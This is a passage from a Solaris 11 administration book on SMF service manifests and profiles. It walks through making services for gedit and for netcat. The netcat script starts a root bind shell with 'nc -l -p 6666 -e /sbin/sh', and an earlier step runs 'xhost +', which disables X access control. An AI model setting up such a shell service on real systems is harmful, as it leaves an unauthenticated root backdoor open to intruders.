    timeout_seconds='30'&gt;
    &lt;method_context&gt;
      &lt;method_credential user='root' group='root' /&gt;
    &lt;/method_context&gt;
  <strong class="calibre8">&lt;/exec_method&gt;</strong>

  &lt;!-- SIGs HUP, TERM, and USR1 are all expected by auditd --&gt;
  <strong class="calibre8">&lt;property_group name='startd' type='framework'&gt;</strong>
    <strong class="calibre8">&lt;propval name='ignore_error' type='astring'</strong>
      <strong class="calibre8">value='core,signal' /&gt;</strong>
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  <strong class="calibre8">&lt;property_group name='general' type='framework'&gt;</strong>
    &lt;!-- to start/stop auditd --&gt;
    &lt;propval name='action_authorization' type='astring'
      value='solaris.smf.manage.audit' /&gt;
    &lt;propval name='value_authorization' type='astring'
      value='solaris.smf.manage.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  <strong class="calibre8">&lt;instance name='default' enabled='true'&gt;</strong>

  &lt;!--
    System-wide audit preselection flags - see auditconfig(1M)
    and audit_flags(5).

    The 'flags' property is the system-wide default set of
    audit classes that is combined with the per-user audit
    flags to configure the process audit at login and role
    assumption time.

    The 'naflags' property is the set of audit classes for
    audit event selection when an event cannot be attributed
    to an authenticated user.
  --&gt;
  <strong class="calibre8">&lt;property_group name='preselection' type='application'&gt;</strong>
    &lt;propval name='flags' type='astring'
      value='lo' /&gt;
    &lt;propval name='naflags' type='astring'
      value='lo' /&gt;
    &lt;propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
    &lt;propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  &lt;!--
    Audit Queue Control Properties - see auditconfig(1M)
      
      Note, that the default value for all the queue control
      configuration parameters is 0, which makes auditd(1M) to
      use current active system parameters.
  --&gt;
  <strong class="calibre8">&lt;property_group name='queuectrl' type='application' &gt;</strong>
    &lt;propval name='qbufsz' type='count'
      value='0' /&gt;
    &lt;propval name='qdelay' type='count'
      value='0' /&gt;
    &lt;propval name='qhiwater' type='count'
      value='0' /&gt;
    &lt;propval name='qlowater' type='count'
      value='0' /&gt;
    &lt;propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
    &lt;propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  &lt;!--
    Audit Policies - see auditconfig(1M)

      Note, that "all" and "none" policies available as a
      auditconfig(1M) policy flags actually means a full/empty set
      of other policy flags. Thus they are not configurable in the
      auditd service manifest, but set all the policies to true
      (all) or false (none).
  --&gt;
  <strong class="calibre8">&lt;property_group name='policy' type='application' &gt;</strong>
    &lt;propval name='ahlt' type='boolean'
      value='false' /&gt;
    &lt;propval name='arge' type='boolean'
      value='false' /&gt;
    &lt;propval name='argv' type='boolean'
      value='false' /&gt;
    &lt;propval name='cnt' type='boolean'
      value='true' /&gt;
    &lt;propval name='group' type='boolean'
      value='false' /&gt;
    &lt;propval name='path' type='boolean'
      value='false' /&gt;
    &lt;propval name='perzone' type='boolean'
      value='false' /&gt;
    &lt;propval name='public' type='boolean'
      value='false' /&gt;
    &lt;propval name='seq' type='boolean'
      value='false' /&gt;
    &lt;propval name='trail' type='boolean'
      value='false' /&gt;
    &lt;propval name='windata_down' type='boolean'
      value='false' /&gt;
    &lt;propval name='windata_up' type='boolean'
      value='false' /&gt;
    &lt;propval name='zonename' type='boolean'
      value='false' /&gt;
    &lt;propval name='read_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
    &lt;propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  &lt;!--
    Audit Remote Server to allow reception of data sent by the
    audit_remote(5) - see audit auditconfig(1M).

    'active' is boolean which defines whether the server functionality
      is activated or not.

    'listen_address' address the server listens on.
      Empty 'listen_address' property defaults to listen on all
      local addresses.

    'listen_port' the local listening port; 0 defaults to 16162 - port
      associated with the "solaris-audit" Internet service name - see
      services(4).

    'login_grace_time' the server disconnects after login grace time
      (in seconds) if the connection has not been successfully
      established; 0 defaults to no limit, default value is 30 (seconds).
    
    'max_startups' number of concurrent unauthenticated connections
      to the server at which the server starts refusing new
      connections; default value is 10. Note that the value might
      be specified in "begin:rate:full" format to allow random
      early drop mode.
  --&gt;
        <strong class="calibre8">&lt;property_group name='audit_remote_server' type='application' &gt;</strong>
                &lt;propval name='active' type='boolean'
                        value='true' /&gt;
                &lt;propval name='listen_address' type='astring'
                        value='' /&gt;
                &lt;propval name='listen_port' type='count'
                        value='0' /&gt;
                &lt;propval name='login_grace_time' type='count'
                        value='30' /&gt;
                &lt;propval name='max_startups' type='astring'
                        value='10' /&gt;
                &lt;property name='read_authorization' type='astring'&gt;
                        &lt;astring_list&gt;
                                &lt;value_node value='solaris.smf.manage.audit' /&gt;
                                &lt;value_node value='solaris.smf.value.audit' /&gt;
                        &lt;/astring_list&gt;
                &lt;/property&gt;
                &lt;propval name='value_authorization' type='astring'
                        value='solaris.smf.value.audit' /&gt;
        <strong class="calibre8">&lt;/property_group&gt;</strong>

  &lt;!--
    Plugins to configure where to send the audit trail - see
    auditconfig(1M), audit_binfile(5), audit_remote(5),
    audit_syslog(5) 

    Each plugin type property group has properties:

    'active' is a boolean which defines whether or not
      to load the plugin.

    'path' is a string which defines name of the
      plugin's shared object in the file system.
      Relative paths assume a prefix of
      "/usr/lib/security/$ISA"

    'qsize' is an integer which defines a plugin specific
      maximum number of records that auditd will queue
      for it. A zero (0) value indicates not defined.
      This overrides the system's active queue control
      hiwater mark.

      and various attributes as defined on the plugin's man page
  --&gt;
  <strong class="calibre8">&lt;property_group name='audit_binfile' type='plugin' &gt;</strong>
    &lt;propval name='active' type='boolean'
      value='true' /&gt;
    &lt;propval name='path' type='astring'
      value='audit_binfile.so' /&gt;
    &lt;propval name='qsize' type='count'
      value='0' /&gt;
    &lt;propval name='p_dir' type='astring'
      value='/var/audit' /&gt;
    &lt;propval name='p_fsize' type='astring'
      value='0' /&gt;
    &lt;propval name='p_minfree' type='count'
      value='1' /&gt;
    &lt;property name='read_authorization' type='astring'&gt;
      &lt;astring_list&gt;
        &lt;value_node value='solaris.smf.manage.audit' /&gt;
        &lt;value_node value='solaris.smf.value.audit' /&gt;
      &lt;/astring_list&gt;
    &lt;/property&gt;
    &lt;propval name='value_authorization' type='astring'
        value='solaris.smf.value.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  <strong class="calibre8">&lt;property_group name='audit_syslog' type='plugin' &gt;</strong>
    &lt;propval name='active' type='boolean'
      value='false' /&gt;
    &lt;propval name='path' type='astring'
      value='audit_syslog.so' /&gt;
    &lt;propval name='qsize' type='count'
      value='0' /&gt;
    &lt;propval name='p_flags' type='astring'
      value='' /&gt;
    &lt;property name='read_authorization' type='astring'&gt;
      &lt;astring_list&gt;
        &lt;value_node value='solaris.smf.manage.audit' /&gt;
        &lt;value_node value='solaris.smf.value.audit' /&gt;
     &lt;/astring_list&gt;
    &lt;/property&gt;
    &lt;propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  <strong class="calibre8">&lt;property_group name='audit_remote' type='plugin' &gt;</strong>
    &lt;propval name='active' type='boolean'
      value='false' /&gt;
    &lt;propval name='path' type='astring'
      value='audit_remote.so' /&gt;
    &lt;propval name='qsize' type='count'
      value='0' /&gt;
    &lt;propval name='p_hosts' type='astring'
      value='' /&gt;
    &lt;propval name='p_retries' type='count'
      value='3' /&gt;
    &lt;propval name='p_timeout' type='count'
      value='5' /&gt;
    &lt;property name='read_authorization' type='astring'&gt;
      &lt;astring_list&gt;
        &lt;value_node value='solaris.smf.manage.audit' /&gt;
        &lt;value_node value='solaris.smf.value.audit' /&gt;
      &lt;/astring_list&gt;
    &lt;/property&gt;
    &lt;propval name='value_authorization' type='astring'
      value='solaris.smf.value.audit' /&gt;
  <strong class="calibre8">&lt;/property_group&gt;</strong>

  &lt;/instance&gt;

  &lt;stability value='Evolving' /&gt;

  &lt;template&gt;
    &lt;common_name&gt;
      &lt;loctext xml:lang='C'&gt;
        Solaris audit daemon
      &lt;/loctext&gt;
    &lt;/common_name&gt;
    <strong class="calibre8">&lt;documentation&gt;</strong>
      <strong class="calibre8">&lt;manpage title='auditd'</strong>
        section='1M'
        manpath='/usr/share/man'/&gt;
      <strong class="calibre8">&lt;manpage title='audit'</strong>
        section='1M'
        manpath='/usr/share/man'/&gt;
      <strong class="calibre8">&lt;manpage title='auditconfig'</strong>
        section='1M'
        manpath='/usr/share/man'/&gt;
      <strong class="calibre8">&lt;manpage title='audit_flags'</strong>
        section='5'
        manpath='/usr/share/man'/&gt;
      <strong class="calibre8">&lt;manpage title='audit_binfile'</strong>
        section='5'
        manpath='/usr/share/man'/&gt;
      <strong class="calibre8">&lt;manpage title='audit_syslog'</strong>
        section='5'
        manpath='/usr/share/man'/&gt;
      <strong class="calibre8">&lt;manpage title='audit_remote'</strong>
        section='5'
        manpath='/usr/share/man'/&gt;
           <strong class="calibre8">&lt;/documentation&gt;</strong>
  &lt;/template&gt;

&lt;/service&gt;

&lt;/service_bundle&gt;</pre></div><p class="calibre7">This<a id="id801" class="calibre1"/> manifest (<code class="email">auditd.xml</code>) has several common elements that appear in other manifests. The key elements<a id="id802" class="calibre1"/> are shown as follows:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">service_bundle</code>: This is the package name of the <code class="email">auditd</code> daemon</li><li class="listitem"><code class="email">service</code>: This is the name of the service (<code class="email">system/auditd</code>)</li><li class="listitem"><code class="email">dependency</code>: This determines which services <code class="email">auditd</code> depends on</li><li class="listitem"><code class="email">dependent</code>: This determines which services depend on <code class="email">auditd</code></li><li class="listitem"><code class="email">exec_method</code>: This is how SMF starts, stops, restarts, and refreshes the <code class="email">auditd</code> daemon</li><li class="listitem"><code class="email">property_group</code>: These are the properties from the <code class="email">auditd</code> service and their instances</li><li class="listitem"><code class="email">template</code>: This determines what information is available about the <code class="email">auditd</code> service and where it is</li><li class="listitem"><code class="email">manpage</code>: This determines which man pages are related to the <code class="email">auditd</code> service</li></ul></div><p class="calibre7">A profile is an XML configuration file that is applied during the first system boot after an Oracle Solaris 11 installation, where it is possible to customize which services and instances will be initialized. The following is a directory listing:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">cd /etc/svc/profile/</strong>
root@solaris11-1:/etc/svc/profile# <strong class="calibre8">ls -al</strong>
total 81
drwxr-xr-x   3 root     sys           17 Dec 23 18:56 .
drwxr-xr-x   3 root     sys           15 Mar  4 02:49 ..
-r--r--r--   1 root     sys        12262 Sep 19  2012 generic_limited_net.xml
-r--r--r--   1 root     sys         6436 Sep 19  2012 generic_open.xml
lrwxrwxrwx   1 root     staff         23 Dec 23 18:56 generic.xml -&gt; generic_limited_net.xml
-r--r--r--   1 root     sys         2581 Sep 19  2012 inetd_generic.xml
lrwxrwxrwx   1 root     staff         17 Dec 23 18:56 inetd_services.xml -&gt; inetd_generic.xml
-r--r--r--   1 root     sys          713 Sep 19  2012 inetd_upgrade.xml
lrwxrwxrwx   1 root     staff         10 Dec 23 18:56 name_service.xml -&gt; ns_dns.xml
-r--r--r--   1 root     sys          571 Sep 19  2012 ns_dns.xml
-r--r--r--   1 root     sys          478 Sep 19  2012 ns_files.xml
-r--r--r--   1 root     sys          713 Sep 19  2012 ns_ldap.xml
-r--r--r--   1 root     sys          832 Sep 19  2012 ns_nis.xml
-r--r--r--   1 root     sys         1673 Sep 19  2012 ns_none.xml
-r--r--r--   1 root     sys          534 Sep 19  2012 platform_none.xml
lrwxrwxrwx   1 root     root          17 Dec 23 18:41 platform.xml -&gt; platform_none.xml
drwxr-xr-x   2 root     sys            3 Dec 23 18:56 site</pre></div><p class="calibre7">Although there<a id="id803" class="calibre1"/> are several manifests, two of them are the most important: <code class="email">generic.xml</code>, which<a id="id804" class="calibre1"/> enables all standard services, and <code class="email">generic_limited_net.xml</code>, which disables most of the Internet services except the <code class="email">ssh</code> service and a few other services that are remote services. The latter manifest is as follows:</p><div><pre class="programlisting">root@solaris11-1:/etc/svc/profile# <strong class="calibre8">more generic_limited_net.xml</strong>
&lt;?xml version='1.0'?&gt;
<strong class="calibre8">(truncated output)</strong>
  &lt;!--
      svc.startd(1M) services
  --&gt;
  &lt;service name='system/coreadm' version='1' type='service'&gt;
    &lt;instance name='default' enabled='true'/&gt;
  &lt;/service&gt;
  &lt;service name='system/cron' version='1' type='service'&gt;
    &lt;instance name='default' enabled='true'/&gt;
  &lt;/service&gt;
  &lt;service name='system/cryptosvc' version='1' type='service'&gt;
    &lt;instance name='default' enabled='true'/&gt;
  &lt;/service&gt;

<strong class="calibre8">(truncated output)</strong>

&lt;service name='network/ssh' version='1' type='service'&gt;
    &lt;instance name='default' enabled='true'/&gt;
  &lt;/service&gt;

<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">A service<a id="id805" class="calibre1"/> can be configured and its behavior can be customized using different methods; additionally, it is very important to know where the SMF framework<a id="id806" class="calibre1"/> reads its properties from. Therefore, the directory and files where the SMF gathers properties of a service are as follows:</p><div><ul class="itemizedlist"><li class="listitem"><code class="email">manifest</code>: This gets properties from the <code class="email">/lib/svc/manifest</code> or <code class="email">/var/svc/manifest</code> directories</li><li class="listitem"><code class="email">site-profile</code>: This gets properties from the <code class="email">/etc/svc/profile/site</code> directory or the <code class="email">site.xml</code> profile file under <code class="email">/etc/svc/profile/</code></li></ul></div><div><div><div><div><h3 class="title2"><a id="ch05lvl3sec48" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">In this section, you saw many details about profiles and manifests such as their elements and available types. All these concepts are going to be deployed in the next section.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch05lvl1sec66" class="calibre1"/>Creating SMF services</h1></div></div></div><p class="calibre7">This time, we are <a id="id807" class="calibre1"/>going to create a new service in Oracle Solaris 11, and the chosen application is gedit, which is a graphical editor. It is obvious that we can show the<a id="id808" class="calibre1"/> same procedure using any application and we will only need to make the necessary alterations to adapt the example.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch05lvl2sec100" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">This recipe requires a virtual machine (VirtualBox or VMware) with Oracle Solaris 11 installed and 4 GB RAM.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch05lvl2sec101" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">The first step is to create a script that starts and stops the application that we are interested in. There are several scripts in <code class="email">/lib/svc/method</code> and we could use one of them as a template, but I have used a very basic model, as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">vi gedit_script.sh</strong> 
#!/sbin/sh
. /lib/svc/share/smf_include.sh
case "$1" in 
'start')
DISPLAY=:0.0
export DISPLAY
/usr/bin/gedit &amp;
;;
'stop')
pkill -x -u 0 gedit
;;
*)
echo $"Usage: $0 {start|stop}"
exit 1
;;

esac
exit $SMF_EXIT_OK</pre></div><p class="calibre7">This script is simple and good, but we need to change its permissions and copy it to the <code class="email">method</code> directory under <code class="email">/lib/svc/</code>, which is the default place for service scripts. This task can be accomplished as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">chmod u+x gedit_script.sh</strong> 
root@solaris11-1:~/chapter5# <strong class="calibre8">more gedit_script.sh</strong>
</pre></div><p class="calibre7">In the next step, we are <a id="id809" class="calibre1"/>going to create a manifest, but as this task is very complicated when starting from scratch, we can take a manifest from another existing service and copy it to the home directory. Afterwards, we have to make appropriate changes to adapt it to achieve our goal, as shown:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">cp /lib/svc/manifest/system/cron.xml /root/chapter5/gedit_script_Manifest.xml</strong>
root@solaris11-1:~# <strong class="calibre8">cd /root/chapter5</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">vi gedit_script_Manifest.xml</strong>
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1"&gt;
&lt;!--
 Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
 Use is subject to license terms.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
--&gt;

&lt;service_bundle type='manifest' name=<strong class="calibre8">'gedit_script'</strong>&gt;

&lt;service
  name=<strong class="calibre8">'application/gedit_script'</strong>
  type='service'
  version='1'&gt;

  &lt;single_instance /&gt;

  &lt;dependency
    name=<strong class="calibre8">'milestone'</strong>
    type='service'
    grouping='require_all'
    restart_on='none'&gt;
<strong class="calibre8">    &lt;service_fmri value='svc:/milestone/multi-user' /&gt;</strong>
  &lt;/dependency&gt;

  &lt;exec_method
    type='method'
    name=<strong class="calibre8">'start</strong>'
    exec=<strong class="calibre8">'/lib/svc/method/gedit_script.sh start</strong>'
<strong class="calibre8">    timeout_seconds='120'&gt;</strong>
    &lt;method_context&gt;
      &lt;method_credential user='root' group='root' /&gt;
    &lt;/method_context&gt;
  &lt;/exec_method&gt;

  &lt;exec_method
    type='method'
    name='<strong class="calibre8">stop</strong>'
    exec=<strong class="calibre8">'/lib/svc/method/gedit_script.sh stop'</strong>
<strong class="calibre8">    timeout_seconds='120'</strong>&gt;
  &lt;/exec_method&gt;

  &lt;<strong class="calibre8">property_group name='startd' type='framework' &gt;</strong>
<strong class="calibre8">  &lt;propval name='duration' type='astring' value='transient' /&gt;</strong>
<strong class="calibre8">  &lt;/property_group&gt;</strong>

  &lt;instance name='default' <strong class="calibre8">enabled='false'</strong> /&gt;

  &lt;stability value='Unstable' /&gt;

  &lt;template&gt;
    &lt;common_name&gt;
      &lt;loctext xml:lang='C'&gt;
      graphical editor (gedit)
      &lt;/loctext&gt;
    &lt;/common_name&gt;
    &lt;documentation&gt;
<strong class="calibre8">      &lt;manpage title='gedit' section</strong>='1' manpath='/usr/share/man' /&gt;
    &lt;/documentation&gt;
  &lt;/template&gt;
&lt;/service&gt;

&lt;/service_bundle&gt;</pre></div><p class="calibre7">That's a long<a id="id810" class="calibre1"/> XML file, but it's easy. Some points deserve an explanation:</p><div><ul class="itemizedlist"><li class="listitem">The service name is <code class="email">gedit_script</code> as seen in the following line:<div><pre class="programlisting">name='application/<strong class="calibre8">gedit_script</strong>'</pre></div></li><li class="listitem">The service depends on the <code class="email">milestone</code> multiuser, as seen in the following snippet:<div><pre class="programlisting">&lt;dependency
    name=<strong class="calibre8">'milestone</strong>'
    type='service'
    grouping='require_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/milestone/multi-user' /&gt;
&lt;/dependency&gt;</pre></div></li><li class="listitem">The time limit to start and stop the service is <code class="email">120</code> seconds as seen in the following snippet:<div><pre class="programlisting">&lt;exec_method
    type='method'
    name=<strong class="calibre8">'start</strong>'
    exec=<strong class="calibre8">'/lib/svc/method/gedit_script.sh start'</strong>
<strong class="calibre8">    timeout_seconds='120'&gt;</strong>
    &lt;method_context&gt;
      &lt;method_credential user='root' group='root' /&gt;
    &lt;/method_context&gt;
  &lt;/exec_method&gt;
&lt;exec_method
    type='method'
    name=<strong class="calibre8">'stop</strong>'
    exec=<strong class="calibre8">'/lib/svc/method/gedit_script.sh stop'</strong>
<strong class="calibre8">    timeout_seconds='120</strong>'&gt;
  &lt;/exec_method&gt;</pre></div></li><li class="listitem">The <code class="email">&lt;property_group&gt;</code> section configures the service as an old service type (<code class="email">transient</code>) to prevent the SMF from automatically restarting <code class="email">gedit_script</code> if it fails, as seen in the following snippet:<div><pre class="programlisting">&lt;property_group name='startd' type='framework' &gt;
  &lt;propval name='duration' type='astring' value='transient' /&gt;
  &lt;/property_group&gt;</pre></div></li><li class="listitem">The service's default status is disabled, as seen in the following line:<div><pre class="programlisting">&lt;instance name='default' <strong class="calibre8">enabled='false'</strong> /&gt;</pre></div></li></ul></div><p class="calibre7">It is time to <a id="id811" class="calibre1"/>verify if this manifest has a syntax error before trying to import it. Therefore, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg validate gedit_script_Manifest.xml</strong>
</pre></div><p class="calibre7">So far, everything sounds good. Therefore, we can import the manifest in the repository by running the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg import gedit_script_Manifest.xml</strong>
</pre></div><div><h3 class="title2"><a id="note08" class="calibre1"/>Note</h3><p class="calibre7">The previous command is a key command because every time a modification is made in the manifest, we have to run this command to update the repository with new configurations.</p></div><p class="calibre7">If there was no error, the service should appear among other services, as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -a | grep gedit</strong>
disabled        3:50:02 svc:/application/gedit_script:default</pre></div><p class="calibre7">That's nice! It's time to start the service and the gedit editor (a graphical editor) must come up (remember that we've made a script named <code class="email">gedit_script.sh</code> to start the <code class="email">gedit</code> editor) after executing the second command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">xhost +</strong>
access control disabled, clients can connect from any host
root@solaris11-1:~# <strong class="calibre8">svcadm enable svc:/application/gedit_script:default</strong>
root@solaris11-1:~# <strong class="calibre8">svcs -a | grep gedit</strong>
online         15:03:19 svc:/application/gedit_script:default
root@solaris11-1:~#</pre></div><p class="calibre7">The properties<a id="id812" class="calibre1"/> from this new service are shown by executing the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcprop svc:/application/gedit_script:default</strong>
general/complete astring 
general/enabled boolean false
general/entity_stability astring Unstable
general/single_instance boolean true
milestone/entities fmri svc:/milestone/multi-user
milestone/grouping astring require_all
milestone/restart_on astring none
milestone/type astring service
manifestfiles/root_chapter5_gedit_script_Manifest_xml astring /root/chapter5/gedit_script_Manifest.xml
startd/duration astring transient
start/exec astring /lib/svc/method/gedit_script.sh\ start
start/group astring root
start/timeout_seconds count 120
start/type astring method
start/use_profile boolean false
start/user astring root
stop/exec astring /lib/svc/method/gedit_script.sh\ stop
stop/timeout_seconds count 120
stop/type astring method
tm_common_name/C ustring graphical\ editor\ \(gedit\)
tm_man_gedit1/manpath astring /usr/share/man
tm_man_gedit1/section astring 1
tm_man_gedit1/title astring gedit
restarter/logfile astring /var/svc/log/application-gedit_script:default.log
restarter/start_pid count 8097
restarter/start_method_timestamp time 1394042599.387615000
restarter/start_method_waitstatus integer 0
restarter/transient_contract count 
restarter/auxiliary_state astring dependencies_satisfied
restarter/next_state astring none
restarter/state astring online
restarter/state_timestamp time 1394042599.397622000
restarter_actions/refresh integer 
restarter_actions/auxiliary_tty boolean true
restarter_actions/auxiliary_fmri astring svc:/application/graphical-login/gdm:default</pre></div><p class="calibre7">To list the<a id="id813" class="calibre1"/> environment variables associated with the <code class="email">gedit_script</code> service, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">pargs -e `pgrep -f gedit_script`</strong>
7919:  tail -f /var/svc/log/application-gedit_script:default.log
envp[0]: ORBIT_SOCKETDIR=/var/tmp/orbit-root
envp[1]: SSH_AGENT_PID=6312
envp[2]: TERM=xterm
envp[3]: SHELL=/usr/bin/bash
envp[4]: XDG_SESSION_COOKIE=f8114f3c252db0743fd58c3e0000009e-1394035066.410005-1956267226
envp[5]: GTK_RC_FILES=/etc/gtk/gtkrc:/root/.gtkrc-1.2-gnome2
envp[6]: WINDOWID=31457283
<strong class="calibre8">(truncated output)</strong>
</pre></div><p class="calibre7">Finally, to stop the <code class="email">gedit_script</code> service and to verify that everything happens as expected, execute the following commands:</p><div><pre class="programlisting">root@solaris11-1:~# <strong class="calibre8">svcadm disable gedit_script</strong>
root@solaris11-1:~# <strong class="calibre8">svcs -a | grep gedit</strong>
disabled       15:26:35 svc:/application/gedit_script:default</pre></div><p class="calibre7">Great! Everything works! Now let's talk about profiles.</p><p class="calibre7">
<strong class="calibre8">Profiles</strong> are also <a id="id814" class="calibre1"/>very important, and they determine which services will be started during the boot process. Therefore, it is appropriate to adapt them to start only the necessary services in order to reduce the attack surface against a hacker.</p><p class="calibre7">The following steps create a new service (more interesting than the <code class="email">gedit_script</code> service) using the great <code class="email">netcat</code> tool (<code class="email">nc</code>). The steps will be the same as those used previously. For remembrance sake, consider the following steps:</p><div><ol class="orderedlist"><li class="listitem" value="1">Create a script.</li><li class="listitem" value="2">Make it executable.</li><li class="listitem" value="3">Copy it to <code class="email">/lib/svc/method</code>.</li><li class="listitem" value="4">Create a manifest for the service.</li><li class="listitem" value="5">Validate the manifest.</li><li class="listitem" value="6">Import the manifest.</li><li class="listitem" value="7">List the service.</li><li class="listitem" value="8">Start the service.</li><li class="listitem" value="9">Test the service.</li><li class="listitem" value="10">Stop the service.</li></ol><div></div><p class="calibre7">The following is<a id="id815" class="calibre1"/> the sequence of commands to create a new service. According to our previous list, the first step is to create a script to start and stop the service, as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">vi netcat.sh</strong>
#!/sbin/sh
. /lib/svc/share/smf_include.sh

case "$1" in 
'start')
/usr/bin/nc -D -d -l -p 6666 -e /sbin/sh &amp;
;;
'stop')
pkill -x -u 0 netcat
;;
*)
echo $"Usage: $0 {start/stop}"
exit 1
;;
esac
exit $SMF_EXIT_OK</pre></div><p class="calibre7">Grant the execution permission to the script and copy it to the appropriate directory where all other scripts from existing services are present, as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">chmod u+x netcat.sh</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">cp netcat.sh /lib/svc/method/</strong>
</pre></div><p class="calibre7">The next step is to create a manifest for the service (<code class="email">netcat</code>). It will be easier to copy the manifest from an existing service and adapt it, as follows:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">vi netcat_manifest.xml</strong>
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE service_bundle SYSTEM "/usr/share/lib/xml/dtd/service_bundle.dtd.1"&gt;
&lt;!--
 Copyright 2009 Sun Microsystems, Inc.  All rights reserved.
 Use is subject to license terms.

    NOTE:  This service manifest is not editable; its contents will
    be overwritten by package or patch operations, including
    operating system upgrade.  Make customizations in a different
    file.
--&gt;

&lt;service_bundle type='manifest' name='netcat'&gt;

&lt;service
  name='application/netcat'
  type='service'
  version='1'&gt;

  &lt;single_instance /&gt;

  &lt;dependency
    name='milestone'
    type='service'
    grouping='require_all'
    restart_on='none'&gt;
    &lt;service_fmri value='svc:/milestone/multi-user' /&gt;
  &lt;/dependency&gt;

  &lt;exec_method
    type='method'
    name='start'
    exec='/lib/svc/method/netcat.sh start'
    timeout_seconds='120'&gt;
    &lt;method_context&gt;
      &lt;method_credential user='root' group='root' /&gt;
    &lt;/method_context&gt;
  &lt;/exec_method&gt;

  &lt;exec_method
    type='method'
    name='stop'
    exec='/lib/svc/method/netcat.sh stop'
    timeout_seconds='120'&gt;
  &lt;/exec_method&gt;

  &lt;property_group name='startd' type='framework' &gt;
  &lt;propval name='duration' type='astring'  value='transient' /&gt;
  &lt;/property_group&gt;

  &lt;instance name='default' enabled='false' /&gt;

  &lt;stability value='Unstable' /&gt;

  &lt;template&gt;
    &lt;common_name&gt;
      &lt;loctext xml:lang='C'&gt;
      hacker tool (nc)
      &lt;/loctext&gt;
    &lt;/common_name&gt;
    &lt;documentation&gt;
      &lt;manpage title='nc' section='1' manpath='/usr/share/man' /&gt;
    &lt;/documentation&gt;
  &lt;/template&gt;
&lt;/service&gt;

&lt;/service_bundle&gt;</pre></div><p class="calibre7">Before continuing, we have to validate the <code class="email">netcat_manifest.xml</code> manifest, and after this step, we can<a id="id816" class="calibre1"/> import the manifest into the service repository, as shown in the following commands:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg validate netcat_manifest.xml</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">svccfg import netcat_manifest.xml</strong>
</pre></div><p class="calibre7">To verify that the service was correctly imported, check whether it appears in the SMF service list by running the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -a | grep netcat</strong>
disabled       18:56:09 svc:/application/netcat:default
root@solaris11-1:~/chapter5# <strong class="calibre8">svcadm enable svc:/application/netcat:default</strong>
root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -a | grep netcat</strong>
online         19:14:17 svc:/application/netcat:default</pre></div><p class="calibre7">To collect other details about the <code class="email">netcat</code> service, execute the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -l svc:/application/netcat:default</strong>
fmri         svc:/application/netcat:default
name         hacker tool (nc)
enabled      true
state        online
next_state   none
state_time   March  5, 2014 07:14:17 PM BRT
logfile      /var/svc/log/application-netcat:default.log
restarter    svc:/system/svc/restarter:default
contract_id  
manifest     /root/chapter5/netcat_manifest.xml
dependency   require_all/none svc:/milestone/multi-user (online)

root@solaris11-1:~/chapter5# <strong class="calibre8">svcs -xv svc:/application/netcat:default</strong>
svc:/application/netcat:default (hacker tool (nc))
 State: online since March  5, 2014 07:14:17 PM BRT
   See: man -M /usr/share/man -s 1 nc
   See: /var/svc/log/application-netcat:default.log
Impact: None.</pre></div><p class="calibre7">The specific <code class="email">netcat service</code> log can be examined to check whether there's any problem by running<a id="id817" class="calibre1"/> the following command:</p><div><pre class="programlisting">root@solaris11-1:~/chapter5# <strong class="calibre8">tail -f /var/svc/log/application-netcat:default.log</strong>
<strong class="calibre8">(truncated output)</strong>
[ Mar  5 19:14:16 Enabled. ]
